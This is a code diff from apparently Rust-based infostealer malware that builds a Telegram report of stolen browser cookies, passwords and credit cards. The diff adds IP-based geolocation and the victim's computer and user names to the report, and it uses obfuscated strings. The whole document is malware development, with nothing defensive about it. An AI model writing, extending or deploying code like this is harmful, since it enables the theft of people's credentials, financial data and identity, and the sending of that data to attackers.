@@ -1,4 +1,5 @@
 use crate::{ExternalLink, LogContent, LogFile, LogSender, SendError};
+use alloc::fmt::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -7,13 +8,14 @@ use collector::{Browser, Collector, Device, DisplayCollector, EmojiBoolean, File
 use core::fmt::{Display, Error, Formatter};
 use derive_new::new;
 use indoc::formatdoc;
+use ipinfo::{unwrapped_ip_info, IpInfo};
 use obfstr::obfstr as s;
 use requests::{
     write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request,
     RequestBuilder,
 };
-use utils::format_size;
 use utils::pc_info::PcInfo;
+use utils::{format_size, internal_code_to_flag};
 
 const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;
 
@@ -43,8 +45,12 @@ where
     C: Collector,
 {
     let PcInfo { computer_name, user_name, product_name } = PcInfo::retrieve();
+    let IpInfo { country, city, .. } = unwrapped_ip_info();
 
     let caption = formatdoc! {r#"
+            ✨ New log from {country_flag} <code>{city}</code>
+            Victim: <code>{computer_name}</code>/<code>{user_name}</code> on <code>{product_name}</code>
+
             🔍 <b>Browser Data</b>
             {first} 🍪 Cookies: <code>{cookies}</code>
             {midd_} 🔐 Passwords: <code>{passwords}</code>
@@ -75,6 +81,9 @@ where
         first = "<code>├─</code>",
         last_ = "<code>└─</code>",
         midd_ = "<code>├─</code>",
+
+        country_flag = internal_code_to_flag(&country).map(Arc::from).unwrap_or(country.clone()),
+
         cookies = collector.get_browser().get_cookies(),
         passwords = collector.get_browser().get_passwords(),
         credit_cards = collector.get_browser().get_credit_cards(),
